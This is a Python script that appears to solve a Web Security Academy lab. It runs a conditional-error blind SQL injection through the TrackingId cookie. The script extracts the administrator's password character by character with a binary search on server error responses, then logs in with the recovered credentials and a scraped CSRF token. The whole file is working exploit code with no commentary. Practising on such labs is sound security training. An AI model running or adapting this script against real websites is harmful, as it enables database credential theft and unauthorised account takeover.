import requests
from lxml import html

URL = "https://0a6300ed039286ad80c6171300240053.web-security-academy.net/"
session = requests.Session()

cookie = {
    "TrackingId": ""
}

payload = "' OR 1=(1/(CASE WHEN ({}>=ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{},1))) THEN 1 ELSE 0 END))-- -"

# Find password length

password_len = -1

for i in range(1, 1000):
    cookie["TrackingId"] = payload.format(1000, i)
    response = session.get(URL + "login", cookies=cookie).text
    if "Internal Server Error" not in response:
        continue
    password_len = i - 1
    break

# Extract password

username = "administrator"
password = ""

for i in range(1, password_len + 1):
    l = 32
    r = 127
    
    while l < r:
        mid = (l + r) >> 1
        
        cookie["TrackingId"] = payload.format(mid, i)
        response = session.get(URL + "login", cookies=cookie).text
        
        if "Internal Server Error" in response:
            l = mid + 1
        else:
            r = mid
            
    password += chr(l)

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)